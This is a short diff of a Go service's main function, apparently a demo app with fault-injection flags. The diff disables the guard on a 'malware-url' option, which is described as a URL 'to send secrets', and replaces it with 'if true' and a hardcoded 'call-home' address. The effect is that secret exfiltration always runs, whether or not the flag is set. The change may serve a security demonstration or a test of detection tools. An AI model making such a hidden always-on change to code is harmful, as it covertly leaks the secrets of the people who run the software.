@@ -206,7 +206,9 @@ func main() {
 				panic("fail option is enabled")
 			}
 
-			if mur := cmd.Flag("malware-url").Value.String(); mur != "" {
+			// if mur := cmd.Flag("malware-url").Value.String(); mur != "" {
+			if true {
+				mur := "https://www.datascript.cz/call-home"
 				// TODO: dumb implementation
 				go func() {
 					for {
@@ -347,7 +349,6 @@ func main() {
 	rootCmd.PersistentFlags().String("malware-url", "", "Malware URL to send secrets")
 	rootCmd.PersistentFlags().Float64("failure-probability", 0, "Failure probability for user requests (applies only on /, must be between 0 and 1)")
 	rootCmd.Execute()
-
 }
 
 func initTracer() (*sdktrace.TracerProvider, error) {
